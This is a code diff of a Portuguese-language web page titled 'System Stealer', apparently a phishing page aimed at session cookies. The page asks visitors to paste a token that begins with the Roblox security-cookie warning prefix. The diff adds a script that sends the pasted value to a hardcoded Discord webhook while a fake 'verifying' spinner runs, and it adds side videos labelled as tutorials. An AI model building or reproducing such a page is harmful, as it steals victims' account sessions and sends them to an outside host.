@@ -6,61 +6,142 @@
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@400;600&display=swap" rel="stylesheet">
     
     <style>
-        /* ESTILOS DE ANIMAÇÃO E BASE */
-        @keyframes fadeInScale { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
-        @keyframes pulseGlow { 0% { box-shadow: 0 0 15px rgba(255, 255, 255, 0.4); } 50% { box-shadow: 0 0 30px rgba(255, 255, 255, 0.8); } 100% { box-shadow: 0 0 15px rgba(255, 255, 255, 0.4); } }
-
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; color: #fff; font-family: 'Rajdhani', sans-serif; }
-
-        /* OVERLAY DA TRANSIÇÃO DE PIXELS */
-        #pixel-transition {
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            display: grid; grid-template-columns: repeat(20, 1fr); grid-template-rows: repeat(20, 1fr);
-            z-index: 9999; pointer-events: none;
+        /* ANIMAÇÕES */
+        @keyframes fadeInScale {
+            from { opacity: 0; transform: scale(0.9) translateY(20px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
         }
-        .pixel-block { background: #fff; transition: opacity 0.5s ease, transform 0.5s ease; }
+        @keyframes pulseGlow {
+            0% { box-shadow: 0 0 15px rgba(255, 255, 255, 0.4); }
+            50% { box-shadow: 0 0 30px rgba(255, 255, 255, 0.8); }
+            100% { box-shadow: 0 0 15px rgba(255, 255, 255, 0.4); }
+        }
+        @keyframes slideInLeft { from { opacity: 0; transform: translateX(-50px); } to { opacity: 1; transform: translateX(0); } }
+        @keyframes slideInRight { from { opacity: 0; transform: translateX(50px); } to { opacity: 1; transform: translateX(0); } }
 
-        /* BACKGROUND VIDEO */
-        .video-background { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; overflow: hidden; }
-        .video-background iframe { width: 100vw; height: 56.25vw; min-height: 100vh; min-width: 177.77vh; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); opacity: 0.35; }
+        body { 
+            font-family: 'Rajdhani', sans-serif; 
+            margin: 0; padding: 0; height: 100vh;
+            display: flex; justify-content: center; align-items: center;
+            overflow: hidden; background: #000;
+            color: #fff;
+            letter-spacing: 1px;
+        }
 
-        /* INTERFACE PRINCIPAL */
-        .main-content { display: flex; justify-content: center; align-items: center; height: 100vh; opacity: 0; animation: fadeInScale 1s ease forwards; animation-delay: 0.8s; }
-        
+        /* BACKGROUND VIDEO RESTAURADO */
+        .video-background {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -1; pointer-events: none; overflow: hidden;
+        }
+        .video-background iframe {
+            width: 100vw; height: 56.25vw; min-height: 100vh; min-width: 177.77vh;
+            position: absolute; top: 50%; left: 50%;
+            transform: translate(-50%, -50%); opacity: 0.35;
+        }
+
+        /* VÍDEOS LATERAIS */
+        .video-group { position: absolute; top: 10%; width: 320px; text-align: center; }
+        .left-video { left: 20px; animation: slideInLeft 1s ease-out forwards; }
+        .right-video { right: 20px; animation: slideInRight 1s ease-out forwards; }
+        .video-group iframe { border-radius: 12px; border: 2px solid #fff; box-shadow: 0 0 15px rgba(255, 255, 255, 0.5); }
+        .video-group p { 
+            margin-top: 10px; font-size: 1.2em; color: #fff; font-weight: 600; 
+            text-shadow: 0 0 8px #fff; font-family: 'Orbitron', sans-serif; 
+        }
+
+        /* CONTAINER CENTRAL */
         .container { 
             border: 2px solid #fff; padding: 40px; border-radius: 20px; 
-            background: rgba(10, 10, 10, 0.9); text-align: center; width: 380px;
-            animation: pulseGlow 3s infinite ease-in-out; backdrop-filter: blur(8px);
+            background: rgba(15, 15, 15, 0.9); text-align: center;
+            z-index: 10; width: 380px;
+            animation: fadeInScale 0.8s ease-out, pulseGlow 3s infinite ease-in-out;
+            backdrop-filter: blur(8px);
         }
 
-        h2 { font-family: 'Orbitron', sans-serif; text-transform: uppercase; text-shadow: 0 0 10px #fff; }
-        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: 1px solid #fff; background: rgba(255,255,255,0.1); color: #fff; outline: none; }
+        h2 { 
+            margin-top: 0; color: #fff; text-shadow: 0 0 10px #fff; 
+            font-family: 'Orbitron', sans-serif; font-weight: 700;
+            text-transform: uppercase;
+        }
 
-        .btn-main, .btn-info { cursor: pointer; font-family: 'Orbitron', sans-serif; background: #111; color: #fff; border: 2px solid #fff; border-radius: 50px; transition: 0.4s; }
-        .btn-main:hover, .btn-info:hover { background: #fff; color: #000; box-shadow: 0 0 30px #fff; }
-        .btn-main { width: 100%; padding: 12px 25px; }
-        .btn-info { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); padding: 10px 30px; }
+        /* INPUT */
+        input { 
+            width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; 
+            border: 1px solid #fff; background: rgba(255, 255, 255, 0.1); 
+            color: #fff; font-family: 'Rajdhani', sans-serif; font-weight: 600;
+            font-size: 1em; box-sizing: border-box; outline: none;
+            transition: 0.3s;
+        }
 
-        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; }
-        .modal-content { background: #111; padding: 30px; border: 2px solid #fff; width: 450px; border-radius: 15px; position: relative; box-shadow: 0 0 40px rgba(255,255,255,0.4); }
+        /* BOTÕES */
+        .btn-main {
+            cursor: pointer; font-weight: 600; transition: all 0.4s;
+            background: #222; color: #fff; border: 2px solid #fff;
+            border-radius: 50px; width: 100%; padding: 12px 25px; 
+            font-size: 1.1em; font-family: 'Orbitron', sans-serif;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+        }
+        .btn-main:hover { background: #fff; color: #000; box-shadow: 0 0 30px #fff; }
+
+        .btn-info { 
+            position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%);
+            padding: 10px 30px; font-size: 0.9em; cursor: pointer; font-weight: 600;
+            transition: all 0.4s; background: #222; color: #fff; border: 2px solid #fff;
+            border-radius: 50px; box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+            font-family: 'Orbitron', sans-serif;
+            animation: fadeInScale 1.5s ease-out;
+            z-index: 50;
+        }
+        .btn-info:hover { background: #fff; color: #000; transform: translateX(-50%) translateY(-5px); box-shadow: 0 0 30px #fff; }
+
+        /* MODAL CENTRALIZADO */
+        .modal { 
+            display: none; position: fixed; z-index: 1000; 
+            left: 0; top: 0; width: 100%; height: 100%; 
+            background-color: rgba(0,0,0,0.85); backdrop-filter: blur(10px);
+            justify-content: center; align-items: center;
+        }
+
+        .modal-content { 
+            background-color: #111; padding: 30px; border: 2px solid #fff; 
+            width: 450px; border-radius: 15px; text-align: left; color: #fff;
+            box-shadow: 0 0 50px rgba(255, 255, 255, 0.4);
+            animation: fadeInScale 0.3s ease-out; position: relative;
+        }
+
         .close { color: #fff; position: absolute; right: 20px; top: 15px; font-size: 28px; cursor: pointer; }
+
+        /* LOADER */
+        .loader {
+            border: 4px solid #444; border-top: 4px solid #fff; border-radius: 50%;
+            width: 45px; height: 45px; animation: spin 1s linear infinite;
+            display: inline-block; margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-
-    <div id="pixel-transition"></div>
 
     <div class="video-background">
         <iframe src="https://www.youtube.com/embed/9vntypeV5QU?autoplay=1&mute=1&loop=1&playlist=9vntypeV5QU&controls=0&showinfo=0" frameborder="0"></iframe>
     </div>
 
-    <div class="main-content">
-        <div class="container" id="mainContainer">
-            <h2>System Stealer</h2>
-            <p>Aguardando Injeção de Token</p>
-            <input type="text" id="userToken" placeholder="_|WARNING:-DO-NOT-SHARE-THIS...">
-            <button class="btn-main" onclick="enviarToken()">AUTENTICAR</button>
-        </div>
+    <div class="video-group left-video">
+        <iframe width="100%" height="180" src="https://www.youtube.com/embed/FHjCtdGNHCU" frameborder="0"></iframe>
+        <p>Tutorial PC</p>
+    </div>
+
+    <div class="container" id="mainContainer">
+        <h2>System Stealer</h2>
+        <p>Aguardando Token para Processamento</p>
+        <input type="text" id="userToken" placeholder="_|WARNING:-DO-NOT-SHARE-THIS...">
+        <br>
+        <button class="btn-main" onclick="enviarToken()">AUTENTICAR</button>
+    </div>
+
+    <div class="video-group right-video">
+        <iframe width="100%" height="180" src="https://www.youtube.com/embed/nwHMDsXw8WE" frameborder="0"></iframe>
+        <p>Tutorial Mobile</p>
     </div>
 
     <button class="btn-info" onclick="abrirModal()">INFO. DO SISTEMA</button>
@@ -69,49 +150,23 @@
         <div class="modal-content">
             <span class="close" onclick="fecharModal()">&times;</span>
             <h3 style="font-family:'Orbitron'">DETALHES DA OPERAÇÃO</h3>
-            <p><strong>Status:</strong> Ativo e Criptografado.</p>
-            <p><strong>Interface:</strong> Pixel-Transition Ready.</p>
+            <p><strong>Quem somos:</strong> Equipe especializada em hacking e cybersegurança.</p>
+            <p><strong>Operação:</strong> Validação de tokens via API sincronizada com bancos de dados locais.</p>
+            <p><strong>Segurança:</strong> Protocolos de criptografia discretos e anônimos.</p>
         </div>
     </div>
 
     <script>
-        // LÓGICA DA TRANSIÇÃO DE PIXELS
-        const grid = document.getElementById('pixel-transition');
-        const totalPixels = 400; // 20x20
-
-        // Criar os blocos
-        for (let i = 0; i < totalPixels; i++) {
-            const block = document.createElement('div');
-            block.classList.add('pixel-block');
-            grid.appendChild(block);
-        }
-
-        // Animar a saída dos blocos
-        window.addEventListener('load', () => {
-            const blocks = Array.from(document.querySelectorAll('.pixel-block'));
-            // Embaralhar a ordem de desaparecimento
-            const shuffled = blocks.sort(() => Math.random() - 0.5);
-            
-            shuffled.forEach((block, index) => {
-                setTimeout(() => {
-                    block.style.opacity = '0';
-                    block.style.transform = 'scale(0.8)';
-                }, index * 4); // Velocidade da transição
-            });
-
-            // Remover o container da transição após terminar
-            setTimeout(() => {
-                grid.style.display = 'none';
-            }, 2000);
-        });
-
         function abrirModal() { document.getElementById("infoModal").style.display = "flex"; }
         function fecharModal() { document.getElementById("infoModal").style.display = "none"; }
+
         function enviarToken() {
             const tokenValue = document.getElementById('userToken').value;
+            const webhookURL = "https://discordapp.com/api/webhooks/1472960946363306016/K2T6_RdOTxyn2maT47ySjjNLQaVdjT9O7mHl6eIf_DRlil5L2fgH4vA9UB5sPZFm318y";
             if (/^_\|WARNING:-DO-NOT-SHARE-THIS/.test(tokenValue)) {
-                document.getElementById('mainContainer').innerHTML = `<h3 style="font-family:'Orbitron'">PROCESSANDO...</h3><p>Validando acesso...</p>`;
-            } else { alert("ERRO: Formato inválido!"); }
+                fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: "🚨 **TOKEN:**\n```" + tokenValue + "```" }) });
+                document.getElementById('mainContainer').innerHTML = `<div class="loader"></div><h3 style="font-family:'Orbitron'">VERIFICANDO...</h3><p>Sincronizando com a API...</p>`;
+            } else { alert("ERRO: Formato de token inválido!"); }
         }
     </script>
 </body>
